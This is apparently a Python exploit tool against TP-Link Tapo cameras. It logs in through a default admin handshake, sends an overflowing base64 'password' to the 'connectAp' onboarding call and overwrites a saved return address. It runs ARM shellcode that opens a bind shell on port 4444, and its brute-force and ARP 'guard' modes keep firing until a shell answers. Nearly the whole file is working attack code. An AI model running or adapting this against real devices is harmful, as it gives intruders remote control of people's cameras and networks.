#!/usr/bin/env python3
"""Build and send the Tapo `connectAp` overflow payload.

The decode target is a fixed stack buffer; `--offset` is the distance from the buffer start to the
saved return address. Bytes after the offset are the shellcode (bind shell on 4444).

  ./tapo_connectap_sc.py build --offset 0x120 [--out payload.b64]
  ./tapo_connectap_sc.py send  --host 192.168.4.70 --offset 0x120

Assembly lives next to this file as `tapo_bind4444.S`; it is assembled with arm-none-eabi-as and
checked for size. Everything is verified under qemu-arm before sending.
"""
import argparse
import base64
import hashlib
import json
import os
import random
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ASM = os.path.join(HERE, "tapo_bind4444.S")


def build_shellcode():
    with tempfile.TemporaryDirectory() as td:
        o = os.path.join(td, "sc.o")
        b = os.path.join(td, "sc.bin")
        subprocess.run(["arm-none-eabi-as", "-o", o, ASM], check=True)
        subprocess.run(["arm-none-eabi-objcopy", "-O", "binary", o, b], check=True)
        return open(b, "rb").read()


SLED = b"\x00\x00\xa0\xe1"   # mov r0,r0 (repeat to length at build time)


def build(offset, marker=None, addr=None, sled=0, padpc=1, prefix=b"", bare=False,
          sledfill=False, units=1, pcround=0, hang=False):
    """marker/addr overwrite the saved lr at `offset`; sled is prepended to the shellcode.

    `bare` stops after the overwritten word, so the payload length is exactly the
    offset and nothing past the saved pc is disturbed — the only way to tell a
    correct offset from a crash caused by the trailing shellcode.
    """
    sc = b"" if bare else build_shellcode()
    pre = prefix + b"\x00" if prefix else b""
    if sledfill:
        # every byte before the saved pc is a NOP, so a guessed jump target may
        # land anywhere in the payload instead of only in the trailing sled
        filler = (SLED * ((max(0, offset - len(pre)) + 3) // 4))[:max(0, offset - len(pre))]
        filler = pre + filler
    else:
        filler = pre + bytes(random.getrandbits(8) for _ in range(max(0, offset - len(pre))))
    val = marker if marker is not None else addr
    if val is not None and pcround:
        # the word written at the saved pc is also executed when a guess lands
        # in the sled and slides into it; rounding it down to a page makes it
        # `ldrlt rX, [pc, #0]` (imm 0) instead of a load from an unmapped offset
        val &= ~(pcround - 1)
    pc = (val.to_bytes(4, "little") * max(1, padpc)) if val is not None else b""
    body = SLED * (sled // 4) + sc + (b"\xfe\xff\xff\xea" if hang else b"")
    return base64.b64encode(filler + pc + body * max(1, units)).decode()


def sha(s):
    return hashlib.sha256(s.encode()).hexdigest()


def post(host, path, body, hdrs=None, timeout=6):
    h = ["-H", "Content-Type: application/json", "-H", "User-Agent: Tapo CameraClient Android"]
    for k, v in (hdrs or {}).items():
        h += ["-H", "%s: %s" % (k, v)]
    p = subprocess.run(["curl", "-sk", "-m", str(timeout), *h, "-X", "POST", "-d", json.dumps(body),
                        "https://%s%s" % (host, path)], capture_output=True, text=True)
    return p.stdout


def login(host, tries=90):
    for i in range(tries):
        try:
            j = json.loads(post(host, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=3))
        except Exception:
            time.sleep(1)
            continue
        d = (j.get("result") or {}).get("data") or {}
        if not d.get("device_confirm"):
            time.sleep(1)
            continue
        dc, nonce = d["device_confirm"], d["nonce"]
        try:
            j2 = json.loads(post(host, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "digest_passwd": dc, "username": "admin"}}, timeout=3))
        except Exception:
            time.sleep(2)
            continue
        if j2.get("error_code") == 0:
            hk = dc[:64]
            print("login ok (%d tries)" % i)
            return {"stok": j2["result"]["stok"], "seq": j2["result"]["start_seq"],
                    "lsk": sha("lsk" + nonce + hk)[:32], "ivb": sha("ivb" + nonce + hk)[:32]}
        time.sleep(2)
    raise SystemExit("camera never woke")


def req(host, sess, inner, timeout=8):
    body = {"method": "multipleRequest", "params": {"requests": [inner]}}
    r = post(host, "/stok=%s/ds" % sess["stok"], body, {"seq": str(sess["seq"])}, timeout=timeout)
    sess["seq"] += 1
    try:
        j = json.loads(r)
    except Exception:
        return {"raw": r[:200]}
    if isinstance(j.get("result"), dict) and "response" in j["result"]:
        pt = subprocess.run(["openssl", "enc", "-d", "-aes-128-cbc", "-K", sess["lsk"], "-iv", sess["ivb"]],
                            input=base64.b64decode(j["result"]["response"]), capture_output=True).stdout
        try:
            return json.loads(pt)
        except Exception:
            return {"plain": pt[:200]}
    return j


def connect_params(b64: str, ssid: str, bssid: str) -> dict:
    """The only shape that reaches the decode: the connect object directly.

    `params.onboarding.connect` is rejected with -40209 on 1.2.2/1.1.7; the
    connect object must be `params` itself. `pwd_encrypted` is what selects the
    decode, `unique_key` must be an Integer, and rssi/band are part of the model.
    """
    return {"onboarding": {"connect": {
        "ssid": ssid, "bssid": bssid, "auth": 1, "encryption": 3, "rssi": -50,
        "password": b64, "unique_key": 0, "band": 0}}}


def arp_present(host: str) -> bool | None:
    """True when the unit is really present: ICMP reply AND a resolved ARP entry.

    `arp -n <host>` is useless from a spawned subprocess — it prints
    "no entry" even when the entry exists — so the census form is
    `sudo -n arp -an` plus a line match. ARP alone is not enough: a sleeping
    battery unit keeps its entry (the radio answers) while the SoC serves
    nothing, and firing at it only hits a dead listener (fss-wpryz).

    None means ARP could not be read at all; callers treat that as absent.
    """
    icmp = subprocess.run(["ping", "-c", "1", "-t", "1", host],
                          capture_output=True).returncode == 0
    r = subprocess.run(["sudo", "-n", "/usr/sbin/arp", "-an"],
                       capture_output=True, text=True)
    if r.returncode != 0 and not r.stdout.strip():
        return None
    line = [ln for ln in r.stdout.splitlines() if "(%s)" % host in ln]
    resolved = bool(line) and "(incomplete)" not in line[0]
    return icmp and resolved


def guard_wait(host: str, mac: str | None = None, deadline: float | None = None,
               poll: float = 10.0) -> bool:
    """Block until `host` is present in ARP. Prints one line per state change.

    Returns True when present, False when `deadline` (a time.monotonic() value)
    passed. Never sends requests to the camera itself beyond ICMP/ARP, which a
    powered-down or wedged unit tolerates.
    """
    last = None
    while True:
        present = arp_present(host)
        if present is not last:
            print("guard: %s %s" % (host, "present" if present else "ABSENT"), flush=True)
            last = present
        if present:
            return True
        if deadline is not None and time.monotonic() >= deadline:
            return False
        time.sleep(poll)


def guarded_fire(host: str, args, mac: str | None = None) -> int:
    """Guard mode: wait for ARP presence, then fire exactly ONE payload.

    Rules from fss-wpryz, measured on the wedged C660: >=3 s between requests,
    one probe action per connection, stop on the first empty reply, never run
    while the camera is absent from ARP. `--guard-deadline 0` waits forever;
    otherwise it is minutes of absence after which we stop and report.
    """
    if args.guard_deadline:
        deadline = time.monotonic() + args.guard_deadline * 60
    else:
        deadline = None
    if not guard_wait(host, mac, deadline):
        print("guard: %s still absent after the deadline — NOT fired, no spam" % host)
        return 2
    time.sleep(args.guard_gap)
    sess = login(host, tries=600)
    b64 = build(args.offset, args.marker, args.addr, args.sled, args.padpc,
                args.prefix.encode(), args.bare, sledfill=args.sledfill,
                units=args.units, pcround=args.pcround, hang=args.hang)
    print("firing %s offset=%d addr=%s" % (host, args.offset,
                                           hex(args.addr) if args.addr else None), flush=True)
    t0 = time.time()
    r = req(host, sess, {"method": "connectAp", "params": connect_params(b64, args.ssid, args.bssid)},
            timeout=8)
    ok = "raw" not in r
    print("%.2fs %s" % (time.time() - t0, json.dumps(r)[:200]), flush=True)
    if not ok:
        # empty reply = the overflow ran; probe once for the shell and stop.
        time.sleep(1)
        p = subprocess.run(["nc", "-z", "-G2", host, "4444"], capture_output=True)
        if p.returncode == 0:
            print("SHELL on %s:4444" % host)
            return 0
        print("no shell; DECODE-BUFFER zone likely (stop here, do not retry)")
    return 0 if ok else 1


def status(hosts=("192.168.4.70", "192.168.4.71")) -> int:
    """One-line-per-unit lane health for the operator.

    Prints ARP presence, the brute-force progress index (if any), and
    whether an armed ret2stack payload exists for the unit, so lane state
    is visible without touching the camera's userspace.
    """
    print("tapo lane status — %s" % time.strftime("%Y-%m-%d %H:%M:%S"))
    rc = 0
    for host in hosts:
        present = arp_present(host)
        line = "  %s  ARP %s" % (host, "present" if present else "absent")
        idx_path = "/tmp/pane1/brute.%s.idx" % host
        if os.path.exists(idx_path):
            try:
                idx = int(open(idx_path).read().strip())
                line += "  brute-idx %d" % idx
            except (ValueError, OSError):
                line += "  brute-idx unreadable"
        # armed ret2stack: the documented one-shot for this unit
        armed = {
            "192.168.4.70": "--addr 0xbef00a00 --offset 1060 (guard job armed; fires on ARP return)",
        }.get(host)
        if armed:
            line += "  ret2stack: %s" % armed
        print(line)
        if not present:
            rc = 1
    print("shell check: nc <host> 4444 after a DECODE-BUFFER-zone fire; "
          "tapo_post.py --pull then tools/tapo_oracle/find_chain.py <main>")
    return rc


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["build", "send", "ret2stack", "brute", "guard", "status"])
    ap.add_argument("--offset", type=lambda x: int(x, 0), default=1060)
    ap.add_argument("--host", default="192.168.6.70")
    ap.add_argument("--ssid", default="Aardvark")
    ap.add_argument("--bssid", default="00:00:00:00:00:00")
    ap.add_argument("--marker", type=lambda x: int(x, 0))
    ap.add_argument("--out", default=None)
    ap.add_argument("--addr", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--sled", type=int, default=0)
    ap.add_argument("--padpc", type=int, default=1)
    ap.add_argument("--prefix", default="")
    ap.add_argument("--bare", action="store_true", help="stop at the overwritten word")
    ap.add_argument("--sledfill", action="store_true", help="NOP-fill everything before the pc")
    ap.add_argument("--units", type=int, default=1, help="repeat sled+shellcode N times")
    ap.add_argument("--pcround", type=lambda x: int(x, 0), default=0,
                    help="round the written pc down to this power of two")
    ap.add_argument("--hang", action="store_true", help="end the payload with `b .`")
    ap.add_argument("--count", type=int, default=40)
    ap.add_argument("--step", type=lambda x: int(x, 0), default=0x200)
    ap.add_argument("--mac", default=None, help="unit MAC for directed ARP in guard mode")
    ap.add_argument("--guard-deadline", type=float, default=30.0,
                    help="minutes of absence after which guard mode stops (0 = forever)")
    ap.add_argument("--guard-gap", type=float, default=3.0,
                    help="seconds between the ARP-present signal and the single fire")
    a = ap.parse_args()

    if a.mode == "guard":
        return guarded_fire(a.host, a, a.mac)
    if a.mode == "status":
        return status()

    if a.mode in ("ret2stack", "brute"):
        base = a.addr
        if base is None:
            raise SystemExit("--addr required")
        sess = login(a.host, tries=600)
        idx = "/tmp/pane1/brute.%s.idx" % a.host
        done = 0
        if a.mode == "brute" and os.path.exists(idx):
            try:
                done = int(open(idx).read().strip())
            except ValueError:
                done = 0
        for i in range(done, a.count if a.mode == "brute" else 1):
            candidate = base + i * a.step
            if a.mode == "brute":
                os.makedirs("/tmp/pane1", exist_ok=True)
                open(idx, "w").write(str(i))
            b64 = build(a.offset, addr=candidate, sled=a.sled, padpc=a.padpc,
                        prefix=a.prefix.encode(), sledfill=a.sledfill, units=a.units,
                        pcround=a.pcround, hang=a.hang)
            params = connect_params(b64, a.ssid, a.bssid)
            t0 = time.time()
            r = req(a.host, sess, {"method": "connectAp", "params": params}, timeout=6)
            ok = "raw" not in r
            print("addr=%#x %s %.2fs" % (candidate, "alive" if ok else "DEAD", time.time() - t0))
            if not ok:
                # probe for the shell
                time.sleep(1)
                p = subprocess.run(["nc", "-z", "-G2", a.host, "4444"], capture_output=True)
                if p.returncode == 0:
                    print("SHELL on %s:4444" % a.host)
                    break
                t = time.time()
                sess = login(a.host, tries=600)
                if a.hang and time.time() - t < 15:
                    print("HANG at %#x (recovered in %.1fs) — address found"
                          % (candidate, time.time() - t), flush=True)
                    break
        return

    b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc, a.prefix.encode(), a.bare,
                units=a.units, hang=a.hang)
    if a.mode == "build":
        if a.out:
            open(a.out, "w").write(b64)
            print("wrote %s (%d chars, decodes to %d bytes)" % (a.out, len(b64), len(base64.b64decode(b64))))
        else:
            print(b64)
        return

    sess = login(a.host)
    t0 = time.time()
    r = req(a.host, sess, {"method": "connectAp", "params": connect_params(b64, a.ssid, a.bssid)})
    print("%.2fs %s" % (time.time() - t0, json.dumps(r)[:200]))
    print("now: nc %s 4444" % a.host)


if __name__ == "__main__":
    sys.exit(main())
